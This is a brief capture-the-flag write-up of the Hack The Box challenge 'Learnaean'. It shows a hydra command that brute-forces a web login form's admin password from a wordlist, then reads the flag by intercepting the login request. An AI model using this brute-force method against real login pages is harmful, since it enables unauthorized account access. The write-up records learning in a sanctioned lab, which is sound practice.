# HTB CTF - Learnaean

- CTF Name: Learnaean
- Resource: Hack The Box CTF
- Difficulty: [20 pts] range
- Number of Flags: 1

Note::: NO, I won't be posting my found FLAGS, but I will be posting the methods I used. 

<hr>


### Flag1
__Acquired By:__
1. cmd first... `cd ..` back 1 level
2. `hydra -l admin -P /usr/share/wordlist.txt.gz xxx.xx.xxx.xxx http-post-form "/:password=^PASS^:Invalid password !" -s XXXXX`
    - Returned: ```14344399 loging tries
    login: admin
    password: XXXXXXXXXXXXXX```

3. Start proxy intercept
4. login to the site and repeat the request in the proxy or view the request in the browsers Developer tools. The flag is in the response.


### Learned
This challenge taught me a little bit about hydra and the anticipated responces that it can catch/look for.

<hr>

Happy Hacking
![](https://media.giphy.com/media/l3vRmVv5P01I5NDAA/giphy.gif)

### Resources:
1. https://robertheaton.com/2013/07/29/padding-oracle-attack/


###### Please Note: that I am still learning and if something that I have stated is incorrect please let me know. I would love to learn more about what I may not understand fully.